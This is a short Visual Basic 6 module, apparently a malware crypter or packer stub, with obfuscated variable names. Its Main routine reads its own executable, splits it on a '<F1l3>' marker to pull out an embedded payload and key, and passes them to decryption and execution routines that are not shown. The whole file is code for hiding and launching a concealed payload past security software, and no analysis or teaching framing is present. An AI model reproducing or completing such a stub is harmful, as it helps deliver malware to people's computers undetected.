Attribute VB_Name = "modMaioen"
Dim gtreyhtrjhytjytj() As String
Dim scijcsiucsiocioowiowcp As String
Dim scocsoiqsoiipaiwxzwz() As Byte
Dim cvpcllllllmsmll As String

Sub Main()
    On Error Resume Next
    If dsiiusdgvpvdpowiope = True Then MsgBox ""
    If eurojpspsopoipe = True Then MsgBox ""
    If zkofiddoodododoodg = True Then MsgBox ""
    
    cvpcllllllmsmll = App.Path & "\" & App.EXEName & ".exe"
    Open cvpcllllllmsmll For Binary As #1
    scijcsiucsiocioowiowcp = Space(FileLen(cvpcllllllmsmll))
    Get #1, 1, scijcsiucsiocioowiowcp
    Close #1
    
    gtreyhtrjhytjytj() = Split(scijcsiucsiocioowiowcp, "<F1l3>")
    scocsoiqsoiipaiwxzwz() = StrConv(gtreyhtrjhytjytj(1), vbFromUnicode)
    aijpaijevjejvzjvcmpqz scocsoiqsoiipaiwxzwz(), gtreyhtrjhytjytj(2)
    aijeuouaioaopsipoaaaaaa cvpcllllllmsmll, enrdfbderfgszertihuhffgjghhghgi()
End Sub
